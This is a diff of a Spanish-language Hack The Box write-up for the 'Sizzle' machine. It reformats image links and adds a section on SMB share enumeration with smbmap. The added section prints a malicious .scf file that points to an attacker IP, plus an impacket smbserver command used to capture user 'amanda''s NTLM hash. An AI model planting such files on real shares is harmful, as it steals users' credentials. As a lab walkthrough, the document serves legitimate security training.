@@ -122,11 +122,11 @@ Utilizando smbmap, con un nombre de usuario cualquiera para entrar como invitado
 
     smbmap -H 10.10.10.103 -u "ssa"
 
-    ![image](https://github.com/loqasto/Sizzle-HTB/assets/111526713/f391c096-9071-42d3-b257-3abae8893f9c)
+![image](https://github.com/loqasto/Sizzle-HTB/assets/111526713/f391c096-9071-42d3-b257-3abae8893f9c)
 
 Siguiendo con la enumeración, y listando la carpeta 'Users' dentro de 'Department Shares', podemos ver una lista de usuarios, que puede venirnos bien para el futuro:
 
-    ![image](https://github.com/loqasto/Sizzle-HTB/assets/111526713/1f98ebfb-84c5-497a-bd5c-5d9fde3950a8)
+![image](https://github.com/loqasto/Sizzle-HTB/assets/111526713/1f98ebfb-84c5-497a-bd5c-5d9fde3950a8)
 
 Aprovechamos que tenemos acceso con usuario anónimo (null session) sobre 'Department Shares/Users', podemos enumerar para comprobar si tenemos permisos de escritura en alguna carpeta dentro de 'Users'. Para ello, vamos a utilizar los siguientes comandos.
 
@@ -170,5 +170,23 @@ Tenemos que fijarnos en 'Everyone', que en este caso tienen el permiso 'READ'. V
 
 El directorio 'Public' tiene permisos 'FULL' para 'Everyone':
 
-    ![image](https://github.com/loqasto/Sizzle-HTB/assets/111526713/21777aa2-f1e4-4534-8bcc-3819f5d3e3ec)
+![image](https://github.com/loqasto/Sizzle-HTB/assets/111526713/21777aa2-f1e4-4534-8bcc-3819f5d3e3ec)
+
+Esto significa que podemos escribir, crear nuevos archivos en este directorio. Sabiendo que es una carpeta compartida, podemos crear un .scf malicioso para intentar conseguir algún hash.
+
+    └─# cat click.scf 
+    [Shell]
+    Command=2
+    IconFile=\\10.10.14.18\smbfolder\pentestlab.ico
+    [Taskbar]
+    Command=ToggleDesktop
+
+Creamos el archivo y por otro lado nos ponemos en escucha con, por ejemplo, smbserver.py (También podriamos hacerlo con 'responder', quitando 'smbfolder' del parámetro 'IconFile'.
+
+    /opt/impacket/examples/smbserver.py smbfolder $(pwd) -smb2support
+
+Recibimos el hash de la usuaria 'amanda':
+
+![image](https://github.com/loqasto/Sizzle-HTB/assets/111526713/86e4e78c-3fa0-4027-9ccb-4eb7e6a18079)
+
 
